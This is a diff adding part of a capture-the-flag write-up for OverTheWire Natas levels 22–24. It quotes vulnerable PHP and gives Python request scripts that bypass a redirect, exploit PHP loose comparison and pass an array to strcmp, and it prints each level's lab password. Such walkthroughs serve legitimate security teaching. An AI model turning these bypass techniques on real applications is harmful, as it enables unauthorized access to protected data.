@@ -1348,3 +1348,144 @@ foreach($validkeys as $key => $defval) {
 but the values are already included in the session by then. Thus, the exploit works. 
 
 Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+# Level 22
+
+## Preventing/manipulating redirects
+
+URL: http://natas22.natas.labs.overthewire.org
+
+The code goes as such:
+
+```php
+ <?
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+
+.
+.
+.
+.
+.
+.
+
+if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    } 
+?> 
+```
+
+From the manual on [`$_GET`](https://www.php.net/manual/en/reserved.variables.get.php), `$_GET` is an associative array of variables passed to the current script via the URL parameters (aka. query string). 
+
+Possible attack vectors:
+
+1. Update the `$_SESSION['admin']` to 1. But since no user input is being used to populate, this option is eliminated.
+
+2. Guess the admin `PHPSESSID`. No session id is being returned on `GET` requests so that is gone.
+
+3. Prevent redirects.
+
+```py
+def exploit():
+    auth_username = 'natas22'
+    auth_password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ' 
+    sess = requests.Session()
+    response = sess.post('http://natas22.natas.labs.overthewire.org/', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response)
+    print("----------------------------------")
+    response = sess.get('http://natas22.natas.labs.overthewire.org/?revelio=1&admin=1', auth=HTTPBasicAuth(auth_username, auth_password), allow_redirects=False)
+    dissect_response(response)
+    print("----------------------------------")
+    if(response.history):
+        for resp in response.history:
+            print(resp.status_code, resp.url)
+        print("Final destination")
+        print(response.status_code, response.url)
+    print("----------------------------------")
+    print(sess.cookies)
+```
+
+A simple session with `allow_redirects=False` disallows redirects. Thus, we successfully come out of the first `if` statement without being redirected. Going to the second `if` statement, a simple check is the key `revelio` is in the `GET` query means `...?revelio=1` makes this condition true. And we have the password.
+
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+# Level 23
+
+URL: http://natas23.natas.labs.overthewire.org
+
+```php
+if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+        echo "<br>The credentials for the next level are:<br>";
+        echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+else{
+        echo "<br>Wrong!<br>";
+    }
+}
+```
+
+Quite simply, we are on the lookout for two stuff:
+
+1. The password should contain `iloveyou`.
+
+2. `$_REQUEST["passwd"] > 10`.
+
+Thus, in our password, we include the stuff `iloveyou` and to bypass the relation operator, inclue a number `> 10` at the starting of the password.
+
+```py
+def exploit():
+    _payload = {'passwd':'14iloveyou1234567'}
+    auth_username = 'natas23'
+    auth_password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
+    response = requests.post('http://natas23.natas.labs.overthewire.org/', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
+    dissect_response(response)
+```
+
+Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+# Level 24
+
+URL: http://natas24.natas.labs.overthewire.org
+
+The backend code:
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+```
+
+Now `strcmp` comparisons are very insecure ([refer](https://www.php.net/manual/en/function.strcmp.php)). Consider the following exploit:
+
+```python
+def exploit():
+    auth_username = 'natas24'
+    auth_password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
+    response = requests.get('http://natas24.natas.labs.overthewire.org/?passwd[]=""', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response)
+```
+
+`passwd[]=""` sets the `$_REQUEST['passwd']` to an array. We do have the PHP warning pop up but also the password :)
+
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+# Level 25
+
+URL: http://natas25.natas.labs.overthewire.org
